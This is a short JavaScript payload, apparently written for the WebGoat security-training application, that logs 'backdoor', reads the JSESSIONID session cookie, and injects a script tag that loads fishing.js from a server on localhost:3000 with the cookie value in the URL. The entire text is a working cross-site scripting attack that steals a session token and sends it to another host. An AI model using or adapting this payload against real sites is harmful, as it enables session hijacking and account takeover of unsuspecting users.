console.log('backdoor');
var fishing = document.createElement('script')
var cookie = goatRouter.lessonController.cookieView.collection.findWhere({name:'JSESSIONID'}).attributes
fishing.setAttribute('src','http://localhost:3000/fishing.js?session='+cookie.value);
document.body.appendChild(fishing);

